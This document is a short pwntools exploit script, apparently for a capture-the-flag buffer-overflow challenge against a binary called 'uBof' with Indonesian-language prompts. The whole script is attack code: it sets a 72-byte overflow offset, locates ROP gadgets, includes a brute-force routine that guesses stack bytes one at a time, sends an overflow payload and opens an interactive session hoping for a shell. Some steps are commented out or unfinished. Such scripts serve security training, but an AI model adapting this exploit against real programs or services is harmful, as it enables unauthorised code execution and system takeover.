from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def bruteforce_next_byte(payload):
    for i in range(256):
        next_test = 0x01 * i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        p.sendline(str(len(test_payload)))
        # Note that we cannot send any newlines here as "read" will just absorb them into the buffer
        p.send(test_payload)
        p.recvuntil(b'Masukkan panjang pesan yang akan dikirim: ')
        output = p.recvline()
        #print(output)
        if "Pesanmu terkirim!" in output.decode():
            print(f"[+] Found next byte {hex(i)}")
            return next_test
        if i == 255:
            print(f"[-] Failed to find next byte")
            exit()


# Find offset to EIP/RIP for buffer overflows
# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './uBof'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
p = start()

pop_rdi = ROP(exe).find_gadget(['pop rdi'])[0]
ret = ROP(exe).find_gadget(['ret'])[0]
# Build the payload
# payload = flat({
#     offset: [
#         0x555555555253,
#         'a' * 30
#     ]
# })
payload_mulai = flat(b'A' * offset)
# rip = b''
# for i in range(8):
#     rip = rip + bruteforce_next_byte(payload_mulai + rip)

# Send the payload
payload_mulai.rjust(0x69, b'A')
p.send(str(len(payload_mulai)))
p.send(payload_mulai)

# Got Shell?
p.interactive()
